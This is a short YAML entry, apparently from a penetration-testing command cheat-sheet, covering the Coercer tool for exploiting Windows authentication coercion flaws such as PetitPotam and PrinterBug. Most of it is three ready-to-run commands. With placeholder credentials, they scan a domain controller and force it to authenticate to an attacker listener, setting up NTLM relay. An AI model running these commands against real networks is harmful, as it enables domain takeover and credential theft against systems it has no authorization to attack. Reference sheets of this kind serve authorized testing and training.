---
description: |
  Coercer — automatically find and exploit Windows authentication
  coercion vulnerabilities (PetitPotam, PrinterBug, DFSCoerce, etc.).

  Reference values:
    Attacker IP: 10.10.14.1
    Target DC: 10.10.10.1
    Username: pentuser
    Password: P@ssw0rd123
command: |
  # Scan for all coercion methods
  coercer scan -t 10.10.10.1 -u pentuser -p 'P@ssw0rd123' -d test.local

  # Coerce authentication
  coercer coerce -t 10.10.10.1 -l 10.10.14.1 -u pentuser -p 'P@ssw0rd123' -d test.local

  # Coerce specific method
  coercer coerce -t 10.10.10.1 -l 10.10.14.1 -u pentuser -p 'P@ssw0rd123' -d test.local --filter-method-name "EfsRpcOpenFileRaw"
phase:
  - Exploitation
target_os:
  - Windows
services:
  - SMB
  - RPC
items:
  - Username
  - Password
techniques:
  - NTLM_Relay_Poisoning
network_position:
  - Internal
references:
  - https://github.com/p0dalirius/Coercer
---
